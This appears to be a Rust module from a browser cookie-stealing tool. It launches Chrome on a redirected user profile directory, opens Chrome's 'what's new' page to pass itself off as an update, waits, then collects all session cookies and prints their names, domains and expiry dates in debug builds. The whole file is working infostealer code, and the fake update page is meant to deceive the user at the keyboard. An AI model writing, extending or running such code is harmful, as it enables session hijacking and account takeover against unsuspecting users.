use futures::StreamExt;
use chromiumoxide::browser::{Browser, BrowserConfig};
use std::path::PathBuf;
use std::time::Duration;

pub async fn start_browser(junc_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let (mut browser, mut handler) = Browser::launch(
            BrowserConfig::builder()
            .with_head()
            .arg("--start-maximized")
            .arg("--no-startup-window")
            .user_data_dir(&junc_path)
            .viewport(None)
            .disable_default_args()
            .build()?
        ).await?;

    let handle = async_std::task::spawn(async move {
        while let Some(h) = handler.next().await {
            if h.is_err() {
                break;
            }
        }
    });

    // Open page for whats new (simulate update)
    let _ = browser.new_page("https://developer.chrome.com/new").await?;

    #[cfg(feature = "debug")]
    println!("[*] Sleeping (10 secs for test) ...");
    async_std::task::sleep(Duration::from_secs(10)).await;

    #[cfg(feature = "debug")]
    println!("[*] Retrieving cookies...");
    let cookies = browser.get_cookies().await?;

    #[cfg(feature = "debug")]
    if cookies.is_empty() {
        println!("[!] No cookies found.");
    } else {
        println!("[+] Cookies Found:");
        cookies.iter().for_each(|cookie| {
            println!(
                "[>] Name: {}\n    Domain: {}\n    Expires: {}",
                cookie.name, cookie.domain, cookie.expires
            );
        });
    }

    browser.close().await?;
    handle.await;
    browser.wait().await?;

    Ok(())
}
